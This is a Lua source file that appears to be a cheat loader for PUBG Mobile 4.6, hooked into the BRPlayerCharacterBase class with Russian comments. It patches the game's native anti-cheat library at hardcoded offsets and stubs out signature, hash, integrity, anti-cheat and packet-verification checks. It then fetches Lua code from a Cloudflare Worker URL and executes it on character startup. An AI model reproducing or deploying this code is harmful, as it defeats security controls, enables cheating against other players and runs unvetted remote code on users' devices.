-- ==============================================================================
-- IPGRE_BR.LUA — IPGRE BYPASS + CLOUDFLARE WORKER MOD LOADER
-- BRPlayerCharacterBase hook (PUBG Mobile 4.6)
-- ==============================================================================

local require     = require
local import      = import
local isValid     = slua.isValid
local CombineClass = require("combine_class")
local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")

-- ═══════════════════════════════════════
-- IPGRE BYPASS MODULE (4.6 NATIVE PATCHES)
-- ═══════════════════════════════════════
local IPGRE = {}

-- Helper functions
local function NoOp()             return true  end
local function ReturnTrue()       return true  end
local function ReturnFalse()      return false end
local function ReturnZero()       return 0     end
local function ReturnEmptyString() return ""   end
local function ReturnDeadBeef()   return 0xDEADBEEF end
local function ReturnNil()        return nil   end
local function ReturnEmptyTable() return {}    end

local function SafeOverride(tbl, key, replacement)
    if tbl and type(tbl[key]) ~= "nil" then
        pcall(function()
            rawset(tbl, key, replacement)
        end)
        if tbl[key] ~= replacement then
            pcall(function() tbl[key] = replacement end)
        end
    end
end

local function GetWorldContext()
    local world = nil
    pcall(function()
        if slua and slua.getWorld then
            world = slua.getWorld()
        elseif _G.slua and _G.slua.getWorld then
            world = _G.slua.getWorld()
        end
    end)
    return world
end

local function PubgNotify(msg, isError)
    local prefix  = isError and "[IPGRE] Ошибка: " or "[IPGRE] "
    local fullMsg = prefix .. tostring(msg)

    if slua and slua.showTip then
        pcall(function() slua.showTip(fullMsg) end)
        return
    end

    local KSL   = import and import("KismetSystemLibrary")
    local world = GetWorldContext()
    if KSL and world and KSL.PrintString then
        local color = isError and "Red" or "Yellow"
        pcall(function() KSL.PrintString(world, fullMsg, true, false, color, 5.0) end)
        return
    end

    local UIManager = package.loaded["GameLua.GameCore.Module.UIManager"]
    if UIManager and UIManager.ShowTip then
        pcall(function() UIManager.ShowTip(fullMsg) end)
        return
    end

    print("[PUBG_NOTIFY] " .. fullMsg)
end

-- ▸▸▸ NATIVE PATCHES (4.6 ONLY) ▸▸▸
local _hasShownNativeResult = false

function IPGRE.PatchNativeOffsets()
    if type(PATCH_LIB) ~= "function" then
        if not _hasShownNativeResult then
            PubgNotify("Нативный мост не найден. Патч пропущен.", true)
            _hasShownNativeResult = true
        end
        return
    end

    -- Оффсеты из канала @gyzzyyds1 (4.6)
    local patches = {
        { lib = "libanogs.so", addr = "0x213000", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x214098", bytes = "C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x214384", bytes = "1F 20 03 D5" },
        { lib = "libanogs.so", addr = "0x21E9C4", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x228168", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2328F0", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2940D0", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2E8A70", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2F7FF4", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x2FB7D8", bytes = "00 00 80 D2 C0 03 5F D6" }, -- Crash Fixer
        { lib = "libanogs.so", addr = "0x31DCB0", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x3211B8", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x32302C", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x330494", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x336294", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x338780", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x35F440", bytes = "00 00 80 D2 C0 03 5F D6" },
        { lib = "libanogs.so", addr = "0x35FC5C", bytes = "00 00 80 D2 C0 03 5F D6" },
    }

    local successCount = 0
    local failCount    = 0

    for _, p in ipairs(patches) do
        local ok, err = pcall(function()
            PATCH_LIB(p.lib, p.addr, p.bytes)
        end)
        if ok then
            successCount = successCount + 1
        else
            failCount = failCount + 1
            print("[IPGRE] Failed patch " .. p.addr .. ": " .. tostring(err))
        end
    end

    if not _hasShownNativeResult then
        if failCount == 0 then
            PubgNotify(string.format("Обход 4.6 успешно применен! (%d патчей)", successCount), false)
        else
            PubgNotify(string.format("Патчи применены частично: ОК %d / Ошибок %d", successCount, failCount), true)
        end
        _hasShownNativeResult = true
    end
end
-- ▸▸▸ END NATIVE PATCHES ▸▸▸

function IPGRE.PatchSLua()
    if slua and slua.getSignature then
        slua.getSignature = ReturnDeadBeef
    end

    local loader = rawget(_G, "slua_loader") or package.loaded["slua.loader"]
    if loader then
        SafeOverride(loader, "verifyBytecode",       ReturnTrue)
        SafeOverride(loader, "checkIntegrity",        ReturnTrue)
        SafeOverride(loader, "disableSignatureCheck", ReturnTrue)
    end

    local ser = package.loaded["slua.serialize"]
    if ser then
        SafeOverride(ser, "check",  ReturnTrue)
        SafeOverride(ser, "verify", ReturnTrue)
    end

    if jit and jit.attach then
        pcall(function() jit.attach(NoOp, "bc") end)
    end

    SafeOverride(_G, "slua_verify",           ReturnTrue)
    SafeOverride(_G, "check_slua_integrity",  ReturnTrue)
end

function IPGRE.PatchPakAndHash()
    local KSL   = import and import("KismetSystemLibrary")
    local world = GetWorldContext()

    if KSL and world then
        local cmds = {
            "pak.DisablePakSignatureCheck 1",
            "pakchunk.EnableSignatureCheck 0",
            "s.VerifyPak 0",
            "sig.Check 0",
            "security.DisableChecks 1",
        }
        for _, cmd in ipairs(cmds) do
            pcall(function() KSL.ExecuteConsoleCommand(world, cmd) end)
        end
    end

    local CMBL = import and import("CreativeModeBlueprintLibrary")
    if CMBL then
        SafeOverride(CMBL, "MD5HashByteArray",    ReturnEmptyString)
        SafeOverride(CMBL, "MD5HashFile",          ReturnEmptyString)
        SafeOverride(CMBL, "GetContentDiffData",   function() return true, "BYPASSED" end)
        SafeOverride(CMBL, "VerifyFileIntegrity",  ReturnTrue)
        SafeOverride(CMBL, "VerifyContent",        ReturnTrue)
        SafeOverride(CMBL, "ValidateContent",      ReturnTrue)
        SafeOverride(CMBL, "CheckContent",         ReturnTrue)
    end

    SafeOverride(_G, "MD5Hash", ReturnEmptyString)
    SafeOverride(_G, "CRC32",   ReturnZero)
    SafeOverride(_G, "SHA1",    ReturnEmptyString)
    SafeOverride(_G, "SHA256",  ReturnEmptyString)

    local fhash = package.loaded["common.file_hash_checker"]
    if fhash then
        SafeOverride(fhash, "CheckFileMD5",  ReturnTrue)
        SafeOverride(fhash, "VerifyFile",    ReturnTrue)
        SafeOverride(fhash, "ValidateAsset", ReturnTrue)
    end
end

function IPGRE.PatchAntiCheat()
    -- Обходим основные AC-хуки через slua
    local acNames = {
        "ACE_Check", "AceCheck", "AntiCheatCheck",
        "SecurityCheck", "IntegrityCheck", "VerifyClient",
        "CheckClient", "ValidateClient", "VerifySession",
        "CheckSession", "ValidateSession",
    }
    for _, name in ipairs(acNames) do
        SafeOverride(_G, name, ReturnTrue)
    end

    -- Пробуем обойти Gamesafe через package.loaded
    local gsNames = {
        "GameSafe", "gamesafe", "GameSafe.core",
        "security.gamesafe", "AntiCheat", "anticheat",
    }
    for _, name in ipairs(gsNames) do
        local mod = package.loaded[name]
        if mod and type(mod) == "table" then
            for k, v in pairs(mod) do
                if type(v) == "function" then
                    SafeOverride(mod, k, ReturnTrue)
                end
            end
        end
    end
end

function IPGRE.PatchNetwork()
    -- Обходим проверку подписи пакетов
    local netNames = {
        "VerifyPacket", "CheckPacket", "ValidatePacket",
        "VerifyMessage", "CheckMessage", "ValidateMessage",
    }
    for _, name in ipairs(netNames) do
        SafeOverride(_G, name, ReturnTrue)
    end
end

-- Запускаем все патчи
function IPGRE.ApplyAll()
    pcall(IPGRE.PatchSLua)
    pcall(IPGRE.PatchPakAndHash)
    pcall(IPGRE.PatchAntiCheat)
    pcall(IPGRE.PatchNetwork)
    pcall(IPGRE.PatchNativeOffsets)
end

-- ═══════════════════════════════════════
-- CLOUDFLARE WORKER MOD LOADER
-- ═══════════════════════════════════════

local MOD_URL    = "https://long-wind-e541.smofeng.workers.dev/"
local MOD_KEY    = "1.lua"          -- файл на воркере
local MOD_RETRY  = 3                -- попыток загрузки
local MOD_DELAY  = 2.0              -- секунд между попытками

local _modLoaded     = false
local _modAttempts   = 0
local _modChunk      = nil          -- скомпилированный чанк

local function TryLoadMod(onSuccess, onFail)
    local http = nil
    pcall(function()
        http = require("http") or _G.http
    end)
    if not http then
        if onFail then onFail("http module not available") end
        return
    end

    local headers = {
        ["Content-Type"] = "application/x-www-form-urlencoded",
        ["User-Agent"]   = "PUBG-Mobile-Mod/4.6",
    }
    local body = "key_path=" .. MOD_KEY

    local ok, err = pcall(function()
        http:Post(MOD_URL, headers, body, function(response, statusCode)
            if statusCode == 200 and response and #response > 0 then
                -- Компилируем полученный Lua-код
                local chunk, compileErr = load(response, "=cloudflare_mod", "t", _G)
                if chunk then
                    _modChunk  = chunk
                    _modLoaded = true
                    pcall(function()
                        local result = chunk()
                        if result ~= nil then
                            _G._WORKER_MOD_RESULT = result
                        end
                    end)
                    PubgNotify("Мод загружен с воркера (" .. tostring(#response) .. " байт)", false)
                    if onSuccess then pcall(onSuccess, result) end
                else
                    PubgNotify("Ошибка компиляции мода: " .. tostring(compileErr), true)
                    if onFail then pcall(onFail, compileErr) end
                end
            else
                local msg = "Воркер вернул HTTP " .. tostring(statusCode)
                PubgNotify(msg, true)
                if onFail then pcall(onFail, msg) end
            end
        end)
    end)

    if not ok then
        PubgNotify("http:Post ошибка: " .. tostring(err), true)
        if onFail then pcall(onFail, err) end
    end
end

-- Загрузка с повторами через time_ticker
local function ScheduleModLoad(attemptsLeft)
    if _modLoaded then return end
    if attemptsLeft <= 0 then
        PubgNotify("Мод не загружен после " .. tostring(MOD_RETRY) .. " попыток", true)
        return
    end

    _modAttempts = _modAttempts + 1
    PubgNotify("Загрузка мода, попытка " .. tostring(_modAttempts) .. "...", false)

    TryLoadMod(
        function() end, -- onSuccess — уже внутри TryLoadMod
        function(err)   -- onFail — повтор через MOD_DELAY секунд
            pcall(function()
                local ticker = require("common.time_ticker")
                if ticker and ticker.AddTimerOnce then
                    ticker.AddTimerOnce(MOD_DELAY, function()
                        ScheduleModLoad(attemptsLeft - 1)
                    end)
                end
            end)
        end
    )
end

-- ═══════════════════════════════════════
-- BRPlayerCharacterBase CLASS
-- ═══════════════════════════════════════

-- Таблица RPC (обязательно до class())
local BRPlayerCharacterBase = {
    ServerRPC = {
        ServerRPC_NearDeathGiveupRescue        = { Reliable = true, Params = {} },
        ServerRPC_CarryDeadBox                  = { Reliable = true, Params = { EPC.Object } },
        RPC_Server_GmPlayAction                 = { Reliable = true, Params = { EPC.Int } },
    },
    ClientRPC = {
        RPC_Client_SetShoudCheckPassWall        = { Reliable = true, Params = { EPC.Bool } },
        ClientRPC_TriggerHighlightMoment        = { Reliable = true, Params = { EPC.UInt32, EPC.UInt32 } },
    },
    MulticastRPC = {
        MulticastRPC_GmPlayAction               = { Reliable = true, Params = { EPC.Int } },
    },
}

-- Создаём класс ПОСЛЕ описания таблицы RPC
local class = require("class")
local CBRPlayerCharacterBase = class(CCharacterBase, nil, BRPlayerCharacterBase)

-- _PostConstruct: инициализация IPGRE + запуск загрузки мода
function CBRPlayerCharacterBase:_PostConstruct()
    -- Вызов родителя (правильный способ через CBRPlayerCharacterBase.__super)
    pcall(function()
        CBRPlayerCharacterBase.__super._PostConstruct(self)
    end)

    -- Применяем все IPGRE патчи
    pcall(IPGRE.ApplyAll)

    -- Запускаем загрузку мода с воркера
    pcall(function()
        ScheduleModLoad(MOD_RETRY)
    end)
end

function CBRPlayerCharacterBase:ReceiveBeginPlay()
    pcall(function()
        CBRPlayerCharacterBase.__super.ReceiveBeginPlay(self)
    end)
    -- На всякий случай перезапускаем загрузку если ещё не загружено
    if not _modLoaded then
        pcall(function() ScheduleModLoad(1) end)
    end
end

function CBRPlayerCharacterBase:ReceiveEndPlay(EndPlayReason)
    pcall(function()
        CBRPlayerCharacterBase.__super.ReceiveEndPlay(self, EndPlayReason)
    end)
end

function CBRPlayerCharacterBase:ctor() end

-- ═══════════════════════════════════════
-- ЭКСПОРТ
-- ═══════════════════════════════════════
return CombineClass.DeclareFeature(CBRPlayerCharacterBase, {}, "BRPlayerCharacterBase")
